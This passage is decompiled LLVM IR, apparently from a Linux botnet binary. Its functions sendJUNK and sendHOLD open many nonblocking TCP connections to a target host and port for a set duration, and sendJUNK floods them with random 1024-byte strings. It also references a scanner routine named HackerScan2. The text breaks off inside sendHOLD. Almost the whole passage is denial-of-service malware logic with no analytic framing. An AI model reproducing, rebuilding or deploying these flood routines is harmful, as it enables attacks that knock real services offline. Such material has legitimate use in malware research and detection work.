  br i1 %v4_1000a6bc, label %dec_label_pc_1000a6c4, label %dec_label_pc_1000a6e8

dec_label_pc_1000a6c4:                            ; preds = %dec_label_pc_1000a5e4
  store i32 268478156, i32* @lr, align 4
  %v1_1000a6c8 = call i32 @__GI_time(i32 0)
  %v3_1000a6d4 = icmp sgt i32 %v1_1000a6c8, %v2_1000a5d0
  br i1 %v3_1000a6d4, label %dec_label_pc_1000a6f8, label %dec_label_pc_1000a5e4.backedge

dec_label_pc_1000a5e4.backedge:                   ; preds = %dec_label_pc_1000a6c4, %dec_label_pc_1000a6e8
  %storemerge22 = phi i32 [ %v1_1000a6ec, %dec_label_pc_1000a6e8 ], [ 0, %dec_label_pc_1000a6c4 ]
  br label %dec_label_pc_1000a5e4

dec_label_pc_1000a6e8:                            ; preds = %dec_label_pc_1000a5e4
  %v1_1000a6ec = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_1000a5e4.backedge

dec_label_pc_1000a6f8:                            ; preds = %dec_label_pc_1000a6c4, %dec_label_pc_1000a148, %dec_label_pc_1000a1f8, %dec_label_pc_1000a1a8
  %v0_1000a720 = phi i32 [ %v4_1000a158, %dec_label_pc_1000a148 ], [ %v4_1000a210, %dec_label_pc_1000a1f8 ], [ %v4_1000a1c0, %dec_label_pc_1000a1a8 ], [ %v1_1000a6c8, %dec_label_pc_1000a6c4 ]
  ret i32 %v0_1000a720

; uselistorder directives
  uselistorder i32 %v1_1000a55c, { 1, 0 }
  uselistorder i32 %v3_1000a4f4, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_1000a320, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_1000a2d0, { 1, 0 }
  uselistorder i32 %v1_1000a2a4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a284, { 13, 14, 15, 2, 3, 4, 16, 1, 5, 17, 6, 7, 8, 9, 0, 10, 11, 12, 18, 19 }
  uselistorder i32 %v2_1000a148, { 1, 2, 0 }
  uselistorder i32 %v1_1000a134, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 ()* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000a6f8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000a5e4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a570, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4e8, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000a3c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a248, { 1, 0 }
  uselistorder label %dec_label_pc_1000a148, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000a724 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000a724, i32* %stack_var_-240, align 4
  store i32 268478292, i32* @lr, align 4
  %v0_1000a750 = call i32 @getdtablesize()
  %v1_1000a758 = udiv i32 %v0_1000a750, 2
  %v2_1000a758 = and i32 %v0_1000a750, -2147483648
  %v3_1000a758 = or i32 %v1_1000a758, %v2_1000a758
  store i32 2, i32* %stack_var_-200, align 4
  %v1_1000a770 = urem i32 %arg2, 65536
  store i32 %v1_1000a770, i32* @r3, align 4
  %v1_1000a778 = call i32 @htons(i32 %v1_1000a770)
  %v2_1000a784 = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000a794 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-196, i32 %v2_1000a784)
  %v3_1000a79c = icmp eq i32 %v4_1000a794, 0
  br i1 %v3_1000a79c, label %dec_label_pc_1000a7a8, label %dec_label_pc_1000ac6c

dec_label_pc_1000a7a8:                            ; preds = %entry
  %v1_1000a7c4 = mul i32 %v1_1000a758, 8
  %v1_1000a7cc = add i32 %v1_1000a7c4, 30
  %v1_1000a7d0 = and i32 %v1_1000a7cc, -16
  %v2_1000a7d8 = load i32, i32* %stack_var_-240, align 4
  %v1_1000a7e0 = load i32, i32* @r1, align 4
  %v3_1000a7e0 = sub i32 %v1_1000a7e0, %v1_1000a7d0
  %v4_1000a7e0 = inttoptr i32 %v3_1000a7e0 to i32*
  store i32 %v2_1000a7d8, i32* %v4_1000a7e0, align 4
  %v1_1000a7f0 = add i32 %v3_1000a7e0, 23
  %v1_1000a7f4 = and i32 %v1_1000a7f0, -16
  %v1_1000a810 = mul i32 %v3_1000a758, 5
  store i32 268478500, i32* @lr, align 4
  %v3_1000a820 = call i32 @__GI_memset(i32 %v1_1000a7f4, i32 0, i32 %v1_1000a810)
  store i32 268478508, i32* @lr, align 4
  %v1_1000a828 = call i32 @malloc(i32 1024)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a84c.478 to i32), i32* @lr, align 4
  %v3_1000a848 = call i32 @__GI_memset(i32 %v1_1000a828, i32 0, i32 1024)
  store i32 268478548, i32* @lr, align 4
  %v1_1000a850 = call i32 @__GI_time(i32 0)
  %v2_1000a85c = add i32 %v1_1000a850, %arg3
  store i32 268479580, i32* @lr, align 4
  %v1_1000ac5810 = call i32 @__GI_time(i32 0)
  %v2_1000ac6411 = icmp slt i32 %v1_1000ac5810, %v2_1000a85c
  br i1 %v2_1000ac6411, label %dec_label_pc_1000ac44.preheader.lr.ph, label %dec_label_pc_1000ac6c

dec_label_pc_1000ac44.preheader.lr.ph:            ; preds = %dec_label_pc_1000a7a8
  %v2_1000ac4c5 = icmp sgt i32 %v3_1000a758, 0
  %v2_1000a9c0 = ptrtoint i32* %stack_var_-184 to i32
  %v2_1000aa24 = ptrtoint i32* %stack_var_-232 to i32
  %v2_1000aa28 = add i32 %v2_1000aa24, 48
  %v2_1000aa98 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000aae4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1000aae8 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000ac44.preheader

dec_label_pc_1000a874:                            ; preds = %dec_label_pc_1000ac44.preheader, %dec_label_pc_1000ac38
  %storemerge28 = phi i32 [ %v1_1000ac3c, %dec_label_pc_1000ac38 ], [ 0, %dec_label_pc_1000ac44.preheader ]
  %v1_1000a87c = mul i32 %storemerge28, 8
  %v2_1000a880 = add i32 %v1_1000a87c, %v1_1000a7f4
  %v1_1000a884 = or i32 %v2_1000a880, 4
  %v2_1000a884 = inttoptr i32 %v1_1000a884 to i8*
  %v3_1000a884 = load i8, i8* %v2_1000a884, align 4
  %v1_1000a894 = icmp eq i8 %v3_1000a884, 0
  %v3_1000a894 = icmp eq i8 %v3_1000a884, 1
  br i1 %v3_1000a894, label %dec_label_pc_1000a9c0, label %dec_label_pc_1000a89c

dec_label_pc_1000a89c:                            ; preds = %dec_label_pc_1000a874
  %v3_1000a8a0 = icmp eq i8 %v3_1000a884, 2
  br i1 %v3_1000a8a0, label %dec_label_pc_1000abac, label %dec_label_pc_1000a8a8

dec_label_pc_1000a8a8:                            ; preds = %dec_label_pc_1000a89c
  br i1 %v1_1000a894, label %dec_label_pc_1000a8b8, label %dec_label_pc_1000ac38

dec_label_pc_1000a8b8:                            ; preds = %dec_label_pc_1000a8a8
  store i32 268478668, i32* @lr, align 4
  %v3_1000a8c8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000a8d4 = mul i32 %storemerge28, 8
  %v2_1000a8d8 = add i32 %v1_1000a8d4, %v1_1000a7f4
  %v2_1000a8dc = inttoptr i32 %v2_1000a8d8 to i32*
  store i32 %v3_1000a8c8, i32* %v2_1000a8dc, align 8
  %v1_1000a8f0 = inttoptr i32 %v2_1000a880 to i32*
  %v2_1000a8f0 = load i32, i32* %v1_1000a8f0, align 8
  store i32 268478748, i32* @lr, align 4
  %v2_1000a918 = call i32 @__libc_fcntl(i32 %v2_1000a8f0, i32 3)
  store i32 268478776, i32* @lr, align 4
  %v2_1000a934 = call i32 @__libc_fcntl(i32 %v2_1000a8f0, i32 4)
  %v2_1000a948 = load i32, i32* %v1_1000a8f0, align 8
  store i32 268478816, i32* @lr, align 4
  %v3_1000a95c = call i32 @__libc_connect(i32 %v2_1000a948, i32 %v2_1000a784, i32 16)
  %v4_1000a968 = icmp eq i32 %v3_1000a95c, -1
  br i1 %v4_1000a968, label %dec_label_pc_1000a970, label %dec_label_pc_1000a984

dec_label_pc_1000a970:                            ; preds = %dec_label_pc_1000a8b8
  %v0_1000a970 = call i32 @__errno_location()
  %v1_1000a978 = inttoptr i32 %v0_1000a970 to i32*
  %v2_1000a978 = load i32, i32* %v1_1000a978, align 4
  %v3_1000a97c = icmp eq i32 %v2_1000a978, 115
  br i1 %v3_1000a97c, label %dec_label_pc_1000a9a4, label %dec_label_pc_1000a984

dec_label_pc_1000a984:                            ; preds = %dec_label_pc_1000a8b8, %dec_label_pc_1000a970
  %v2_1000a994 = load i32, i32* %v1_1000a8f0, align 8
  store i32 ptrtoint (i32* @global_var_1000a9a0.479 to i32), i32* @lr, align 4
  %v1_1000a99c = call i32 @__libc_close(i32 %v2_1000a994)
  br label %dec_label_pc_1000ac38

dec_label_pc_1000a9a4:                            ; preds = %dec_label_pc_1000a970
  store i8 1, i8* %v2_1000a884, align 4
  br label %dec_label_pc_1000ac38

dec_label_pc_1000a9c0:                            ; preds = %dec_label_pc_1000a874
  store i32 %v2_1000a9c0, i32* %stack_var_-232, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge

dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge: ; preds = %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge.dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge_crit_edge, %dec_label_pc_1000a9c0
  %v3_1000a9d8.pre = phi i32 [ %v2_1000a9c0, %dec_label_pc_1000a9c0 ], [ %v3_1000a9d8.pre.pre, %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge.dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge_crit_edge ]
  %v1_1000a9f047 = phi i32 [ 1, %dec_label_pc_1000a9c0 ], [ %v1_1000a9f0, %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge.dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge_crit_edge ]
  %v1_1000a9dc = mul nuw nsw i32 %v1_1000a9f047, 4
  %v2_1000a9e0 = add i32 %v1_1000a9dc, %v3_1000a9d8.pre
  %v2_1000a9e8 = inttoptr i32 %v2_1000a9e0 to i32*
  store i32 0, i32* %v2_1000a9e8, align 4
  %v1_1000a9f0 = add nuw nsw i32 %v1_1000a9f047, 1
  %tmp45 = icmp ult i32 %v1_1000a9f0, 32
  br i1 %tmp45, label %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge.dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge_crit_edge, label %dec_label_pc_1000aa04

dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge.dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge_crit_edge: ; preds = %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge
  %v3_1000a9d8.pre.pre = load i32, i32* %stack_var_-232, align 4
  br label %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge

dec_label_pc_1000aa04:                            ; preds = %dec_label_pc_1000a9d4.dec_label_pc_1000a9d4_crit_edge
  %v1_1000aa14 = inttoptr i32 %v2_1000a880 to i32*
  %v2_1000aa14 = load i32, i32* %v1_1000aa14, align 8
  %v1_1000aa18 = udiv i32 %v2_1000aa14, 32
  %v1_1000aa20 = mul nuw nsw i32 %v1_1000aa18, 4
  %v1_1000aa2c = add i32 %v2_1000aa28, %v1_1000aa20
  %v1_1000aa30 = inttoptr i32 %v1_1000aa2c to i32*
  %v2_1000aa30 = load i32, i32* %v1_1000aa30, align 4
  %v1_1000aa48 = urem i32 %v2_1000aa14, 32
  %v3_1000aa50 = shl i32 1, %v1_1000aa48
  %v2_1000aa54 = or i32 %v3_1000aa50, %v2_1000aa30
  store i32 %v2_1000aa54, i32* %v1_1000aa30, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_1000aa8c = load i32, i32* %v1_1000aa14, align 8
  %v1_1000aa90 = add i32 %v2_1000aa8c, 1
  store i32 268479156, i32* @lr, align 4
  %v5_1000aab0 = call i32 @__libc_select(i32 %v1_1000aa90, i32 0, i32 %v2_1000a9c0, i32 0, i32 %v2_1000aa98)
  %v3_1000aac0 = icmp eq i32 %v5_1000aab0, 1
  br i1 %v3_1000aac0, label %dec_label_pc_1000aac8, label %dec_label_pc_1000ab64

dec_label_pc_1000aac8:                            ; preds = %dec_label_pc_1000aa04
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000aae0 = load i32, i32* %v1_1000aa14, align 8
  store i32 268479236, i32* @lr, align 4
  %v5_1000ab00 = call i32 @getsockopt(i32 %v2_1000aae0, i32 1, i32 4, i32 %v2_1000aae4, i32 %v2_1000aae8)
  %v3_1000ab04 = load i32, i32* %stack_var_-44, align 4
  %v3_1000ab08 = icmp eq i32 %v3_1000ab04, 0
  br i1 %v3_1000ab08, label %dec_label_pc_1000ab48, label %dec_label_pc_1000ab10

dec_label_pc_1000ab10:                            ; preds = %dec_label_pc_1000aac8
  %v2_1000ab20 = load i32, i32* %v1_1000aa14, align 8
  store i32 268479276, i32* @lr, align 4
  %v1_1000ab28 = call i32 @__libc_close(i32 %v2_1000ab20)
  store i8 0, i8* %v2_1000a884, align 4
  br label %dec_label_pc_1000ac38

dec_label_pc_1000ab48:                            ; preds = %dec_label_pc_1000aac8
  store i8 2, i8* %v2_1000a884, align 4
  br label %dec_label_pc_1000ac38

dec_label_pc_1000ab64:                            ; preds = %dec_label_pc_1000aa04
  %v4_1000ab6c = icmp eq i32 %v5_1000aab0, -1
  br i1 %v4_1000ab6c, label %dec_label_pc_1000ab74, label %dec_label_pc_1000ac38

dec_label_pc_1000ab74:                            ; preds = %dec_label_pc_1000ab64
  %v2_1000ab84 = load i32, i32* %v1_1000aa14, align 8
  store i32 268479376, i32* @lr, align 4
  %v1_1000ab8c = call i32 @__libc_close(i32 %v2_1000ab84)
  store i8 0, i8* %v2_1000a884, align 4
  br label %dec_label_pc_1000ac38

dec_label_pc_1000abac:                            ; preds = %dec_label_pc_1000a89c
  %v2_1000abb4 = call i32 @makeRandomStr(i32 %v1_1000a828, i32 1024)
  %v1_1000abc8 = inttoptr i32 %v2_1000a880 to i32*
  %v2_1000abc8 = load i32, i32* %v1_1000abc8, align 8
  store i32 268479456, i32* @lr, align 4
  %v4_1000abdc = call i32 @__libc_send(i32 %v2_1000abc8, i32 %v1_1000a828, i32 1024, i32 16384)
  %v4_1000abe8 = icmp eq i32 %v4_1000abdc, -1
  br i1 %v4_1000abe8, label %dec_label_pc_1000abf0, label %dec_label_pc_1000ac38

dec_label_pc_1000abf0:                            ; preds = %dec_label_pc_1000abac
  %v0_1000abf0 = call i32 @__errno_location()
  %v1_1000abf8 = inttoptr i32 %v0_1000abf0 to i32*
  %v2_1000abf8 = load i32, i32* %v1_1000abf8, align 4
  %v3_1000abfc = icmp eq i32 %v2_1000abf8, 11
  br i1 %v3_1000abfc, label %dec_label_pc_1000ac38, label %dec_label_pc_1000ac04

dec_label_pc_1000ac04:                            ; preds = %dec_label_pc_1000abf0
  %v2_1000ac14 = load i32, i32* %v1_1000abc8, align 8
  store i32 268479520, i32* @lr, align 4
  %v1_1000ac1c = call i32 @__libc_close(i32 %v2_1000ac14)
  store i8 0, i8* %v2_1000a884, align 4
  br label %dec_label_pc_1000ac38

dec_label_pc_1000ac38:                            ; preds = %dec_label_pc_1000a8a8, %dec_label_pc_1000ab64, %dec_label_pc_1000abac, %dec_label_pc_1000abf0, %dec_label_pc_1000ab74, %dec_label_pc_1000ab48, %dec_label_pc_1000ab10, %dec_label_pc_1000a9a4, %dec_label_pc_1000a984, %dec_label_pc_1000ac04
  %v1_1000ac3c = add nuw nsw i32 %storemerge28, 1
  %v2_1000ac4c = icmp slt i32 %v1_1000ac3c, %v3_1000a758
  br i1 %v2_1000ac4c, label %dec_label_pc_1000a874, label %dec_label_pc_1000ac54.loopexit

dec_label_pc_1000ac54.loopexit:                   ; preds = %dec_label_pc_1000ac38, %dec_label_pc_1000ac44.preheader
  store i32 268479580, i32* @lr, align 4
  %v1_1000ac58 = call i32 @__GI_time(i32 0)
  %v2_1000ac64 = icmp slt i32 %v1_1000ac58, %v2_1000a85c
  br i1 %v2_1000ac64, label %dec_label_pc_1000ac44.preheader, label %dec_label_pc_1000ac6c

dec_label_pc_1000ac44.preheader:                  ; preds = %dec_label_pc_1000ac44.preheader.lr.ph, %dec_label_pc_1000ac54.loopexit
  br i1 %v2_1000ac4c5, label %dec_label_pc_1000a874, label %dec_label_pc_1000ac54.loopexit

dec_label_pc_1000ac6c:                            ; preds = %dec_label_pc_1000ac54.loopexit, %dec_label_pc_1000a7a8, %entry
  %v0_1000ac94 = phi i32 [ %v4_1000a794, %entry ], [ %v1_1000ac5810, %dec_label_pc_1000a7a8 ], [ %v1_1000ac58, %dec_label_pc_1000ac54.loopexit ]
  ret i32 %v0_1000ac94

; uselistorder directives
  uselistorder i32 %v1_1000ac3c, { 1, 0 }
  uselistorder i32 %v1_1000a9f0, { 1, 0 }
  uselistorder i32 %v2_1000a8f0, { 1, 0 }
  uselistorder i8* %v2_1000a884, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000a880, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge28, { 2, 0, 1 }
  uselistorder i32 %v2_1000a9c0, { 1, 0, 2 }
  uselistorder i32 %v2_1000a85c, { 1, 0 }
  uselistorder i32 %v2_1000a784, { 1, 0 }
  uselistorder i32 %v1_1000a770, { 1, 0 }
  uselistorder i32 %v3_1000a758, { 1, 0, 2 }
  uselistorder i32 %v1_1000a758, { 1, 0 }
  uselistorder i32 %v0_1000a750, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 268479580, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac44.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac54.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac38, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1000a984, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000ac98 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000ac98, i32* %stack_var_-256, align 4
  store i32 268479688, i32* @lr, align 4
  %v0_1000acc4 = call i32 @getdtablesize()
  %v1_1000accc = udiv i32 %v0_1000acc4, 2
  %v2_1000accc = and i32 %v0_1000acc4, -2147483648
  %v3_1000accc = or i32 %v1_1000accc, %v2_1000accc
  store i32 2, i32* %stack_var_-208, align 4
  %v1_1000ace4 = urem i32 %arg2, 65536
  store i32 %v1_1000ace4, i32* @r3, align 4
  %v1_1000acec = call i32 @htons(i32 %v1_1000ace4)
  %v2_1000acf8 = ptrtoint i32* %stack_var_-208 to i32
  %v4_1000ad08 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-204, i32 %v2_1000acf8)
  %v3_1000ad10 = icmp eq i32 %v4_1000ad08, 0
  br i1 %v3_1000ad10, label %dec_label_pc_1000ad1c, label %dec_label_pc_1000b290

dec_label_pc_1000ad1c:                            ; preds = %entry
  %v1_1000ad38 = mul i32 %v1_1000accc, 8
  %v1_1000ad40 = add i32 %v1_1000ad38, 30
  %v1_1000ad44 = and i32 %v1_1000ad40, -16
  %v2_1000ad4c = load i32, i32* %stack_var_-256, align 4
  %v1_1000ad54 = load i32, i32* @r1, align 4
  %v3_1000ad54 = sub i32 %v1_1000ad54, %v1_1000ad44
  %v4_1000ad54 = inttoptr i32 %v3_1000ad54 to i32*
  store i32 %v2_1000ad4c, i32* %v4_1000ad54, align 4
  %v1_1000ad64 = add i32 %v3_1000ad54, 23
  %v1_1000ad68 = and i32 %v1_1000ad64, -16
  %v1_1000ad84 = mul i32 %v3_1000accc, 5
  store i32 268479896, i32* @lr, align 4
  %v3_1000ad94 = call i32 @__GI_memset(i32 %v1_1000ad68, i32 0, i32 %v1_1000ad84)
  store i32 268479904, i32* @lr, align 4
  %v1_1000ad9c = call i32 @malloc(i32 1024)
  store i32 ptrtoint ([3 x i8]* @global_var_1000adc0.480 to i32), i32* @lr, align 4
  %v3_1000adbc = call i32 @__GI_memset(i32 %v1_1000ad9c, i32 0, i32 1024)
  store i32 268479944, i32* @lr, align 4
  %v1_1000adc4 = call i32 @__GI_time(i32 0)
  %v2_1000add0 = add i32 %v1_1000adc4, %arg3
  store i32 268481152, i32* @lr, align 4
  %v1_1000b27c13 = call i32 @__GI_time(i32 0)
  %v2_1000b28814 = icmp slt i32 %v1_1000b27c13, %v2_1000add0
  br i1 %v2_1000b28814, label %dec_label_pc_1000b268.preheader.lr.ph, label %dec_label_pc_1000b290

dec_label_pc_1000b268.preheader.lr.ph:            ; preds = %dec_label_pc_1000ad1c
  %v2_1000b2708 = icmp sgt i32 %v3_1000accc, 0
  %v2_1000af34 = ptrtoint i32* %stack_var_-192 to i32
  %v2_1000af98 = ptrtoint i32* %stack_var_-248 to i32
  %v2_1000af9c = add i32 %v2_1000af98, 56
  %v2_1000b00c = ptrtoint i32* %stack_var_-64 to i32
  %v2_1000b058 = ptrtoint i32* %stack_var_-52 to i32
  %v2_1000b05c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_1000b268.preheader

dec_label_pc_1000ade8:                            ; preds = %dec_label_pc_1000b268.preheader, %dec_label_pc_1000b25c
  %storemerge311 = phi i32 [ %v1_1000b260, %dec_label_pc_1000b25c ], [ 0, %dec_label_pc_1000b268.preheader ]
  %v1_1000adf0 = mul i32 %storemerge311, 8
  %v2_1000adf4 = add i32 %v1_1000adf0, %v1_1000ad68
  %v1_1000adf8 = or i32 %v2_1000adf4, 4
  %v2_1000adf8 = inttoptr i32 %v1_1000adf8 to i8*
  %v3_1000adf8 = load i8, i8* %v2_1000adf8, align 4
  %v1_1000ae08 = icmp eq i8 %v3_1000adf8, 0
  %v3_1000ae08 = icmp eq i8 %v3_1000adf8, 1
  br i1 %v3_1000ae08, label %dec_label_pc_1000af34, label %dec_label_pc_1000ae10

dec_label_pc_1000ae10:                            ; preds = %dec_label_pc_1000ade8
  %v3_1000ae14 = icmp eq i8 %v3_1000adf8, 2
  br i1 %v3_1000ae14, label %dec_label_pc_1000b120, label %dec_label_pc_1000ae1c

dec_label_pc_1000ae1c:                            ; preds = %dec_label_pc_1000ae10
  br i1 %v1_1000ae08, label %dec_label_pc_1000ae2c, label %dec_label_pc_1000b25c

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000ae1c
  store i32 268480064, i32* @lr, align 4
  %v3_1000ae3c = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000ae48 = mul i32 %storemerge311, 8
  %v2_1000ae4c = add i32 %v1_1000ae48, %v1_1000ad68
  %v2_1000ae50 = inttoptr i32 %v2_1000ae4c to i32*
  store i32 %v3_1000ae3c, i32* %v2_1000ae50, align 8
  %v1_1000ae64 = inttoptr i32 %v2_1000adf4 to i32*
  %v2_1000ae64 = load i32, i32* %v1_1000ae64, align 8
  store i32 268480144, i32* @lr, align 4
  %v2_1000ae8c = call i32 @__libc_fcntl(i32 %v2_1000ae64, i32 3)
  store i32 268480172, i32* @lr, align 4
  %v2_1000aea8 = call i32 @__libc_fcntl(i32 %v2_1000ae64, i32 4)
  %v2_1000aebc = load i32, i32* %v1_1000ae64, align 8
  store i32 268480212, i32* @lr, align 4
  %v3_1000aed0 = call i32 @__libc_connect(i32 %v2_1000aebc, i32 %v2_1000acf8, i32 16)
  %v4_1000aedc = icmp eq i32 %v3_1000aed0, -1
  br i1 %v4_1000aedc, label %dec_label_pc_1000aee4, label %dec_label_pc_1000aef8

dec_label_pc_1000aee4:                            ; preds = %dec_label_pc_1000ae2c
  %v0_1000aee4 = call i32 @__errno_location()
  %v1_1000aeec = inttoptr i32 %v0_1000aee4 to i32*
  %v2_1000aeec = load i32, i32* %v1_1000aeec, align 4
  %v3_1000aef0 = icmp eq i32 %v2_1000aeec, 115
  br i1 %v3_1000aef0, label %dec_label_pc_1000af18, label %dec_label_pc_1000aef8

dec_label_pc_1000aef8:                            ; preds = %dec_label_pc_1000ae2c, %dec_label_pc_1000aee4
  %v2_1000af08 = load i32, i32* %v1_1000ae64, align 8
  store i32 ptrtoint (i32* @global_var_1000af14.481 to i32), i32* @lr, align 4
  %v1_1000af10 = call i32 @__libc_close(i32 %v2_1000af08)
  br label %dec_label_pc_1000b25c

dec_label_pc_1000af18:                            ; preds = %dec_label_pc_1000aee4
  store i8 1, i8* %v2_1000adf8, align 4
  br label %dec_label_pc_1000b25c

dec_label_pc_1000af34:                            ; preds = %dec_label_pc_1000ade8
  br label %dec_label_pc_1000af48

dec_label_pc_1000af48:                            ; preds = %dec_label_pc_1000af34, %dec_label_pc_1000af48
  %storemerge57 = phi i32 [ 0, %dec_label_pc_1000af34 ], [ %v1_1000af64, %dec_label_pc_1000af48 ]
  %v1_1000af50 = mul nuw nsw i32 %storemerge57, 4
  %v2_1000af54 = add i32 %v1_1000af50, %v2_1000af34
  %v2_1000af5c = inttoptr i32 %v2_1000af54 to i32*
  store i32 0, i32* %v2_1000af5c, align 4
  %v1_1000af64 = add nuw nsw i32 %storemerge57, 1
  %tmp50 = icmp ult i32 %v1_1000af64, 32
  br i1 %tmp50, label %dec_label_pc_1000af48, label %dec_label_pc_1000af78

dec_label_pc_1000af78:                            ; preds = %dec_label_pc_1000af48
  %v1_1000af88 = inttoptr i32 %v2_1000adf4 to i32*
  %v2_1000af88 = load i32, i32* %v1_1000af88, align 8
  %v1_1000af8c = udiv i32 %v2_1000af88, 32
  %v1_1000af94 = mul nuw nsw i32 %v1_1000af8c, 4
  %v1_1000afa0 = add i32 %v1_1000af94, %v2_1000af9c
  %v1_1000afa4 = inttoptr i32 %v1_1000afa0 to i32*
  %v2_1000afa4 = load i32, i32* %v1_1000afa4, align 4
  %v1_1000afbc = urem i32 %v2_1000af88, 32
  %v3_1000afc4 = shl i32 1, %v1_1000afbc
  %v2_1000afc8 = or i32 %v3_1000afc4, %v2_1000afa4
  store i32 %v2_1000afc8, i32* %v1_1000afa4, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v2_1000b000 = load i32, i32* %v1_1000af88, align 8
  %v1_1000b004 = add i32 %v2_1000b000, 1
  store i32 268480552, i32* @lr, align 4
  %v5_1000b024 = call i32 @__libc_select(i32 %v1_1000b004, i32 0, i32 %v2_1000af34, i32 0, i32 %v2_1000b00c)
  %v3_1000b034 = icmp eq i32 %v5_1000b024, 1
  br i1 %v3_1000b034, label %dec_label_pc_1000b03c, label %dec_label_pc_1000b0d8

dec_label_pc_1000b03c:                            ; preds = %dec_label_pc_1000af78
  store i32 4, i32* %stack_var_-56, align 4
  %v2_1000b054 = load i32, i32* %v1_1000af88, align 8
  store i32 268480632, i32* @lr, align 4
  %v5_1000b074 = call i32 @getsockopt(i32 %v2_1000b054, i32 1, i32 4, i32 %v2_1000b058, i32 %v2_1000b05c)
  %v3_1000b078 = load i32, i32* %stack_var_-52, align 4
  %v3_1000b07c = icmp eq i32 %v3_1000b078, 0
  br i1 %v3_1000b07c, label %dec_label_pc_1000b0bc, label %dec_label_pc_1000b084

dec_label_pc_1000b084:                            ; preds = %dec_label_pc_1000b03c
  %v2_1000b094 = load i32, i32* %v1_1000af88, align 8
  store i32 268480672, i32* @lr, align 4
  %v1_1000b09c = call i32 @__libc_close(i32 %v2_1000b094)
  store i8 0, i8* %v2_1000adf8, align 4
  br label %dec_label_pc_1000b25c

dec_label_pc_1000b0bc:                            ; preds = %dec_label_pc_1000b03c
  store i8 2, i8* %v2_1000adf8, align 4
  br label %dec_label_pc_1000b25c

dec_label_pc_1000b0d8:                            ; preds = %dec_label_pc_1000af78
  %v4_1000b0e0 = icmp eq i32 %v5_1000b024, -1
  br i1 %v4_1000b0e0, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b25c

